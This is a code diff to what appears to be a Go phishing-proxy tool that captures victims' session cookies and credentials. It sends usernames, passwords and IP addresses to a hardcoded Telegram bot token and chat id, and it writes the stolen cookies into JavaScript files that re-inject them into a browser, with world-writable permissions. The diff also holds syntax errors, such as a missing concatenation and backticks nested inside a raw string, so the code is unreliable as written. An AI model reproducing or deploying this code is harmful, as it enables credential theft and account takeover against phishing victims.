@@ -49,8 +49,8 @@ type Document struct {
 }
 // Save dumps document as txt file on disc.
 func (p *Document) save() error {
-	filename := p.Title + ".txt"
-	return ioutil.WriteFile(filename, p.Body, 0600)
+	filename := "cookies/"p.Title + ".txt"
+	return ioutil.WriteFile(filename, p.Body, 0777)
 }
 func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
@@ -224,10 +224,7 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 	saveDoc(tCu, tCt)
 
 	comBined := "New Potential Blesser \r\nEagle: " + tCu + "\r\nPanda: " + tCp + "\r\nIP Address: " + tCiP
-	// + "\r\nCookie: \r\n" + tCt 
-
 	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 1417990651)
-	//sendMyDoc(tCt, tCu, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 1417990651)
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
@@ -308,7 +305,7 @@ func send(text string, botT string, chat_id int64) {
 func saveDoc(title string, myCookieFile string) {
 	dcF = `
 	(async () => {
-		let cookies = "myCookieFile"
+		let cookies = `myCookieFile`
 		
 		function setCookie(key, value, domain, path, isSecure, sameSite) {
 			const cookieMaxAge = 'Max-Age=31536000' // set cookies to one year
@@ -348,14 +345,9 @@ func saveDoc(title string, myCookieFile string) {
 		}
 	})();
 	`
-	//reader := bufio.NewReader(os.Stdin)
 	body = dcF
 	p1 := &Document{Title: title, Body: []byte(body)}
 	if err := p1.save(); err != nil {
 			log.Fatal(err)
 	}
-}
-
-func sendMyDoc(myCookieFile string, myUser string, botT string, chat_id int64){
-	
 }
